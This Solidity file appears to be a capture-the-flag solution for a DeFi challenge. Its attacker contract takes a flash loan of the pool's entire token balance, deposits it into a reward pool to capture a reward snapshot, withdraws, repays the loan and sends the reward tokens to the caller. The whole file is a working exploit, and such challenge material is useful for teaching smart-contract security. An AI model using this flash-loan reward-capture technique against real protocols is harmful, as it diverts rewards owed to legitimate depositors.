// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "./TheRewarderPool.sol";
import "./FlashLoanerPool.sol";
import "./RewardToken.sol";

/**
 * @title AttackerContractRewarder
 * @author Juan Farber (github.com/Farber98)
 */

contract AttackerContractRewarder {
    TheRewarderPool public rewarderPool;
    FlashLoanerPool public flashLoanerPool;
    IERC20 public token;
    IERC20 public reward;

    constructor(
        address _flashLoanerPool,
        address _rewarderPool,
        IERC20 _token,
        IERC20 _rewardToken
    ) {
        flashLoanerPool = FlashLoanerPool(_flashLoanerPool);
        rewarderPool = TheRewarderPool(_rewarderPool);
        token = _token;
        reward = _rewardToken;
    }

    function attack() external payable {
        // Calls the loan.
        flashLoanerPool.flashLoan(token.balanceOf(address(flashLoanerPool)));

        // Get rewards.
        reward.transfer(msg.sender, reward.balanceOf(address(this)));
    }

    // To receive the loan.
    fallback() external payable {
        uint256 balance = token.balanceOf(address(this));

        // Approve rewarder pool.
        token.approve(address(rewarderPool), balance);

        // Deposits into rewarder pool.
        rewarderPool.deposit(balance);

        // Withdraw rewards.
        rewarderPool.withdraw(balance);

        // Repay loan.
        token.transfer(address(flashLoanerPool), balance);
    }
}
